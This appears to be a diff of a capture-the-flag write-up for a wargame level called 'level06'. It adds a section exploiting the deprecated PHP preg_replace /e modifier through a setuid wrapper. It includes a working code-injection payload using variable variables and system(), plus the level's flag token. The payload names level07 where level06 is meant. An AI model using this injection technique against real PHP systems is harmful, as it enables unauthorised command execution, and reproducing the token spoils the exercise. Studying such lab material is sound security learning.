@@ -25,45 +25,7 @@ Output:
 level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaabebdcd979e47982e99fa318d1225e5249abea7, not stripped
 ```
 
-Contents of `level06.php`:
-
-```php
-#!/usr/bin/php
-<?php
-function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
-function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
-$r = x($argv[1], $argv[2]); print $r;
-?>
-```
-
-Pretty much unreadable. Here is a refactored version:
-
-```php
-#!/usr/bin/php
-
-<?php
-function y($m) {
-    $m = preg_replace("/\./", " x ", $m);
-    $m = preg_replace("/@/", " y", $m);
-    return $m;
-}
-
-function x($file_path, $_unused) {
-    $a = file_get_contents($file_path);
-    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
-    $a = preg_replace("/\[/", "(", $a);
-    $a = preg_replace("/\]/", ")", $a);
-    return $a;
-}
-
-$r = x($argv[1], $argv[2]);
-print $r;
-?>
-```
-
-We can see that this script makes use of an obscure (and deprecated) feature of PHP: the PCRE pattern modifier [`PREG_REPLACE_EVAL`](https://php-legacy-docs.zend.com/manual/php5/en/reference.pcre.pattern.modifiers#reference.pcre.pattern.modifiers.eval), marked with `e`.
-
-Now for the ELF executable:
+Ghidra output for the executable:
 
 ```c
 undefined4 main(undefined4 param_1,int param_2,char **param_3)
@@ -140,4 +102,76 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-Better. It looks like `level06` is a setuid/setguid wrapper for `level06.php`.
+
+
+Contents of `level06.php`:
+
+```php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+```
+
+Pretty much unreadable. Here is a refactored version:
+
+```php
+#!/usr/bin/php
+
+<?php
+function y($m) {
+    $m = preg_replace("/\./", " x ", $m);
+    $m = preg_replace("/@/", " y", $m);
+    return $m;
+}
+
+function x($file_path, $z) {
+    $a = file_get_contents($file_path);
+    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+    $a = preg_replace("/\[/", "(", $a);
+    $a = preg_replace("/\]/", ")", $a);
+    return $a;
+}
+
+$r = x($argv[1], $argv[2]);
+print $r;
+?>
+```
+
+It looks like `level06` is a setuid/setguid wrapper for `level06.php`.
+
+We can see that this script makes use of an obscure (and deprecated) feature of PHP: the PCRE pattern modifier [`PREG_REPLACE_EVAL`](https://php-legacy-docs.zend.com/manual/php5/en/reference.pcre.pattern.modifiers#reference.pcre.pattern.modifiers.eval), marked with `e`. This allows arbitrary code execution (like `eval()`) after the text replacement. This is obiously dangerous, especially when matching greedy quantifier `(.*)`.
+
+The function `x()` requires `[x ` as suffix and `]` in order to be exploited. So our string must look like `[x ...]`.
+
+PHP also supports [variable variables](https://www.php.net/manual/en/language.variables.variable.php), which is a weird name to describe getting a variable by its name as a string. For example:
+
+```php
+$a = "phpsux";
+$b = "a";
+
+echo "{${$b}}";
+```
+
+Will output `phpsux`. Combined with `eval()`, this can be used to execute basically anything.
+
+```sh
+echo '[x {${system($z)}}]' > /tmp/phpsux && ./level07 /tmp/phpsux getflag
+```
+
+Output:
+
+```
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+```
+
+Check flag:
+
+```
+level07@localhost's password: wiok45aaoguiboiki2tuin6ub
+```
+
+Conclusion: PHP is a weird and dumb language.
